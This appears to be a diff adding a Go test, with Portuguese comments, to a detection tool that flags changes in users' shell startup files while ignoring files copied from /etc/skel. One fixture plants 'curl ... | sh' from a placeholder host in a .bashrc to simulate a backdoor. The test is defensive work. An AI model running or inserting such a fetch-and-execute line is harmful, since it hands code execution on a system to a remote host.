@@ -111,6 +111,48 @@ func TestDiferencaEntreInventarios(t *testing.T) {
 	}
 }
 
+func TestContaNovaComArquivosDoSkelNaoViraAchado(t *testing.T) {
+	bashrc := "# .bashrc\nalias ll='ls -l'\n"
+	root := fstest.MapFS{
+		"etc/passwd":       file("root:x:0:0:root:/root:/bin/bash\n"),
+		"etc/skel/.bashrc": file(bashrc),
+	}
+	c := &Collector{Root: root, Homes: Homes(root, 1000)}
+	prev := Inventory(c.Collect())
+	// Conta nova criada pelo useradd: .bashrc copiado do skel; outra conta com .bashrc diferente do modelo.
+	root["etc/passwd"] = file("root:x:0:0:root:/root:/bin/bash\nana:x:1001:1001::/home/ana:/bin/bash\n" +
+		"bia:x:1002:1002::/home/bia:/bin/bash\n")
+	root["home/ana/.bashrc"] = file(bashrc)
+	root["home/bia/.bashrc"] = file(bashrc + "curl -s http://exemplo.invalid/x | sh\n")
+	c.Homes = Homes(root, 1000)
+	second := c.Collect()
+	hits := ChangeHits(second, Diff(second, prev))
+	var paths []string
+	for _, h := range hits {
+		paths = append(paths, h.Item.Path)
+	}
+	if len(hits) != 1 || hits[0].Item.Path != "/home/bia/.bashrc" {
+		t.Fatalf("só o .bashrc diferente do skel deveria virar achado de mudança: %v", paths)
+	}
+	// Alteração posterior no arquivo que veio do skel continua virando achado.
+	prev = Inventory(second)
+	root["home/ana/.bashrc"] = file(bashrc + "export X=1\n")
+	third := c.Collect()
+	if sigs := hitSigs(ChangeHits(third, Diff(third, prev))); len(sigs) != 1 {
+		t.Fatalf("alteração no .bashrc vindo do skel deveria virar achado: %v", sigs)
+	}
+	// Conta apagada: os arquivos de shell somem do inventário sem virar achado.
+	prev = Inventory(third)
+	root["etc/passwd"] = file("root:x:0:0:root:/root:/bin/bash\n")
+	delete(root, "home/ana/.bashrc")
+	delete(root, "home/bia/.bashrc")
+	c.Homes = Homes(root, 1000)
+	fourth := c.Collect()
+	if sigs := hitSigs(ChangeHits(fourth, Diff(fourth, prev))); len(sigs) != 0 {
+		t.Fatalf("arquivos de shell de conta apagada viraram achado: %v", sigs)
+	}
+}
+
 func TestMascaraSegredosDaLinhaDeComando(t *testing.T) {
 	got := MaskArgs([]string{"/usr/bin/mysql", "-uroot", "-pSegredo1", "--password", "abc", "token=xyz",
 		"https://user:senha@repo.example/x", "--db-password=p@ss", "normal"})
